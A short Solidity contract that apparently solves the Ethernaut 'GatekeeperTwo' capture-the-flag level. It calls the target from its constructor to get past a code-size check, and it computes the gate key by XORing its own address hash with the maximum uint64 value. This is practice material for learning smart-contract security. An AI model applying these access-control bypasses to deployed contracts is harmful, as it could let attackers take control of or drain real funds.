// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGatekeeperTwo {
  constructor(address _gatekeeperAddr) public {
    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1; 
    IGatekeeperTwo gatekeeper = IGatekeeperTwo(_gatekeeperAddr);
    gatekeeper.enter(bytes8(_gateKey));
  }
}